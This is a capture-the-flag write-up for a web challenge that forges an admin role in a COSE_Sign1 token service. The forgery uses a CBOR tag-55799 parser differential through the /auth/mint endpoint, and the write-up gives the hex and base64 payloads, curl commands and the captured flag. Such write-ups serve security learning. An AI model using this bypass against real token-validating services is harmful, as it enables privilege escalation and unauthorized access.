# Canonical Sin -- Web

**Flag:** `isfcr{c4n0n1c4l_d1ff3r3nt14l_t4g_55799_1s_th3_s3lf_d3scr1b3_tr4p_2ec4}`
**Tools:** curl -sk, Python 3 + cbor2/base64/nacl (COSE_Sign1 verify), manual CBOR hex, OpenCode AI pair-solver (Muse Spark 1.3)
**Scripts:** `solve.py` is a faithful reconstruction of the method actually used (same bytes/endpoints), re-expressed as a single script; requires the live service.

## Enumeration

Service at `https://isfcrpesu-canonical-sin.chals.io` (500 pts), creds `guest/guest123`.

```
$ curl -sk https://isfcrpesu-canonical-sin.chals.io/            # broker routes
$ curl -sk -X POST https://isfcrpesu-canonical-sin.chals.io/auth/login \
    -H 'Content-Type: application/json' -d '{"username":"guest","password":"guest123"}'
$ curl -sk https://isfcrpesu-canonical-sin.chals.io/auth/keys
```

Login returns a `COSE_Sign1` token: header `{1: -8 (EdDSA), 4: 'main-2026-01'}`, payload
`{sub, iat, exp, role: 'user', caps: ['read:profile']}`, which verifies under `GET /auth/keys`.

```
$ curl -sk https://isfcrpesu-canonical-sin.chals.io/vault/list -H "Authorization: Bearer $GUEST"
$ curl -sk https://isfcrpesu-canonical-sin.chals.io/vault/secret/flag -H "Authorization: Bearer $GUEST"
```

`/vault/list` shows `welcome` + `flag` entries; fetching `flag` as guest gives `403 role must be admin`.
Re-encoding the payload CBOR by hand with `role: 'admin'` and re-attaching it fails with bad signature --
the server verifies EdDSA, so direct tamper is dead.

## Analysis

`POST /auth/mint` merges a caller-supplied `extra_claims_b64u` CBOR map into the claims and re-signs with the
server key -- a self-describe oracle. Probing mapped the validator: `sub`/`iat`/`exp` are reserved, `role`
goes through an allowlist, `caps` must stay an allowlist array, and there are two `admin` filters -- one over
the raw claim bytes, one over the decoded value.

Bypass 1 (indefinite-length text `7F 626164 636D696E FF` for `"ad"+"min"`) passes the raw-bytes scan but still
fails the decoded `admin` check. Bypass 2 is the differential tag: CBOR tag `55799` (`D9 D9 F7`). The mint-side
validator keeps the `Tag` object, so `Tag(55799, 'admin') != 'admin'` and it passes; the vault side decodes with
`cbor2`, which strips the unknown tag back to the plain string `'admin'`.

## Exploit

Mint map `A2`: `role = Tag(55799, indef-text 'admin')`, `caps = ['read:vault']`:

```
manual CBOR hex: a264726f6c65d9d9f77f626164636d696eff6463617073816a726561643a7661756c74
extra_claims_b64u: omRyb2xl2dn3f2JhZGNtaW7_ZGNhcHOBanJlYWQ6dmF1bHQ
```

```
$ curl -sk -X POST https://isfcrpesu-canonical-sin.chals.io/auth/mint \
    -H "Authorization: Bearer $GUEST" -H 'Content-Type: application/json' \
    -d '{"extra_claims_b64u":"omRyb2xl2dn3f2JhZGNtaW7_ZGNhcHOBanJlYWQ6dmF1bHQ"}'
$ curl -sk https://isfcrpesu-canonical-sin.chals.io/vault/secret/flag \
    -H "Authorization: Bearer $MINTED"
```

The minted token carries the tagged-admin role, the vault decodes it to `admin` with `read:vault`, and the flag
endpoint returns the flag -- verified twice against the live service.

## Flag

`isfcr{c4n0n1c4l_d1ff3r3nt14l_t4g_55799_1s_th3_s3lf_d3scr1b3_tr4p_2ec4}`
